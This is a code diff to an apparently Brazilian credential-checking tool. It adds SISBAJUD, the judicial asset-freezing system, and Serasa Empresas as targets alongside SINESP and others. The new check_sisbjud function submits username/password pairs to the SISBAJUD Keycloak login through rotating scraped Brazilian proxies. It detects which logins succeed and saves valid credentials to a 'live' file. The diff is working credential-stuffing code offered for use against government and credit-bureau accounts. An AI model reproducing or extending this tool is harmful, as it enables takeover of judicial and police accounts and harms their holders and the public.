@@ -78,6 +78,8 @@ def menu():
         ("8", "CheckONN",      "app.checkonn.com"),
         ("9", "Proxies BR",    "gerar + checar"),
         ("10","SINESP",        "seguranca.sinesp.gov.br"),
+        ("11","Serasa Empresas","sitenet.serasa.com.br"),
+        ("12","SISBAJUD",      "sisbajud.cnj.jus.br"),
         ("0", "Sair",          ""),
     ]
     for num, nome, site in items:
@@ -360,6 +362,31 @@ def check_serasa(user, pwd):
         return True, f"token:{str(token)[:20]}..."
     return False, ""
 
+_SISBJUD_URL_LOGIN = (
+    "https://sso.cloud.pje.jus.br/auth/realms/pje/protocol/openid-connect/auth"
+    "?client_id=sisbajud&redirect_uri=https://sisbajud.cnj.jus.br/&response_type=code"
+)
+
+def check_sisbjud(user, pwd):
+    s  = requests.Session()
+    px = _get_proxy()
+    r = s.get(_SISBJUD_URL_LOGIN, proxies=px, timeout=15)
+    form = BeautifulSoup(r.text, "html.parser").find("form", {"id": "kc-form-login"})
+    if not form:
+        raise Exception("sem form de login")
+    action = form.get("action")
+    r2 = s.post(
+        action,
+        data={"username": user, "password": pwd, "login": "Entrar"},
+        proxies=px, timeout=15,
+    )
+    html = r2.text
+    if "Usuário ou senha inválido" in html:
+        return False, ""
+    if "kc-form-login" in html:
+        return False, ""
+    return True, ""
+
 # ── proxy manager ──────────────────────────────────────────────────────────────
 _PROXY_FONTES_TXT = [
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=BR&ssl=all&anonymity=all",
@@ -475,6 +502,7 @@ CONFIGS = {
     "8":  ("CheckONN",      check_checkonn,      "live_checkonn.txt",      5, 0.3),
     "10": ("SINESP",        check_sinesp,        "live_sinesp.txt",        5, 0.3),
     "11": ("Serasa Empresas", check_serasa,      "live_serasa.txt",        5, 0.3),
+    "12": ("SISBAJUD",        check_sisbjud,      "live_sisbjud.txt",       5, 0.3),
 }
 
 # ── main ───────────────────────────────────────────────────────────────────────
